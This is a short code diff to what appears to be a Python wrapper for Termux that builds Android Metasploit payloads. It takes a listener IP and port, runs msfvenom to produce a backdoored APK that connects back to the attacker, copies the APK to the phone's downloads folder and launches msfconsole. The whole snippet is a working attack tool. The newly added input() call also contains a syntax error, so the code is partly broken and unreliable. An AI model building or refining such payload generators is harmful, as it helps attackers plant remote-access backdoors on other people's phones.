@@ -10,8 +10,8 @@ os.system("ifconfig")
 print("select your inet-'ip address'.")
 lhost = input("Enter your ip address - ",)
 lport = input("Enter your port number - ",)
-apk_name = input("Enter apk name - ",)
-msfvenom_sentence = "msfvenom -p "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name+".apk"
+apk_name = input("Enter apk name - ",,".apk")
+msfvenom_sentence = "msfvenom -p "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
 
 def payload():
     if Android_payload == "first":
@@ -20,7 +20,7 @@ def payload():
         os.system("msfconsole")
     elif Android_payload == "second":
         os.system(msfvenom_sentence)
-        os.system("cp "+apk_name,'.apk'+" /data/data/com.termux/files/home/storage/downloads")
+        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
         os.system("msfconsole")
     else:
         print("Wrong syntax")
